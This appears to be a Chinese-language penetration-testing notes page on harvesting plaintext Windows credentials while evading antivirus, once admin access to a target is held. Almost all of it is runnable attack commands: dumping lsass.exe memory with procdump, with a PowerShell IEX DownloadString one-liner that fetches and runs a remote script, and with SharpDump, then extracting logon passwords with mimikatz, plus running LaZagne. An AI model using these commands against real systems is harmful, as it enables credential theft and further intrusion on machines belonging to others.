# 免杀抓取明文

## 1、前提条件

必须已经事先拿到目标机器的管理权限,且看到有管理员的登录会话

```text
query user
```

![](../../.gitbook/assets/image%20%28435%29.png)

## 2、Prodump

直接指定 lsass.exe 进程名进行抓取即可,之后只需把生成的 lsass.dmp 文件拖回本地

```text
cd c:\Windows\Temp

bitsadmin /rawreturn /transfer getfile https://raw.githubusercontent.com/klionsec/CommonTools/master/procdump.exe c:\windows\temp\dump.exe

dump.exe -accepteula -ma lsass.exe lsass.dmp
```

![](../../.gitbook/assets/image%20%28440%29.png)

接着,再在本地用 mimikatz.exe 去加载读取即可\[版本保持一致\]

```text
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

![](../../.gitbook/assets/image%20%28441%29.png)

## 3、powershell

### 1、远程执行： 

只适用于 2008r2 之后的系统

```text
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/klionsec/CommonTools/master/Out-Minidump.ps1'); Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp"

tasklist | findstr /c:"egui.exe" /c:"ekrn.exe"

dir c:\windows\Temp | findstr "lsass
```

![](../../.gitbook/assets/image%20%28439%29.png)

同样,之后只需把 lsass\_504.dmp 文件拖到本地机器再用 mimikatz.exe 加载读取即可

```text
mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" exit
```

![](../../.gitbook/assets/image%20%28434%29.png)

### 2、本地执行

```text
powershell –exec bypass –Command "& {Import-Module 'C:\Tools\Out-Minidump.ps1'; Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp}"
```

![](../../.gitbook/assets/image%20%28438%29.png)

PS: powershell 导 lsass.exe 进程数据差不多文件要比用 prodump 导的小 10M 左右

```text
mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" exit
```

![](../../.gitbook/assets/image%20%28436%29.png)

## 4、sharpDump

项目地址：[https://github.com/GhostPack/SharpDump](https://github.com/GhostPack/SharpDump) 

将.sln用MSBuild编译成.exe     

```text
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe E:\SharpDump-master\SharpDump.sln /t:Rebuild /p:Configuration=Release
```

![](../../.gitbook/assets/image%20%28431%29.png)

直接运行：

![](../../.gitbook/assets/image%20%28430%29.png)

需要线把 bin 重命名为 zip 后缀,然后正常解压出里面的 文件,再给 mimikatz 去读取即可

```text
mimikatz.exe "sekurlsa::minidump debug596" "sekurlsa::logonPasswords full" "exit"
```

![](../../.gitbook/assets/image%20%28432%29.png)

## 5、LaZagne\(python\)

项目地址：[https://github.com/AlessandroZ/LaZagne/releases](https://github.com/AlessandroZ/LaZagne/releases)

下载直接运行`lazgne.exe all`

![](../../.gitbook/assets/image%20%28442%29.png)

![](../../.gitbook/assets/image%20%28433%29.png)



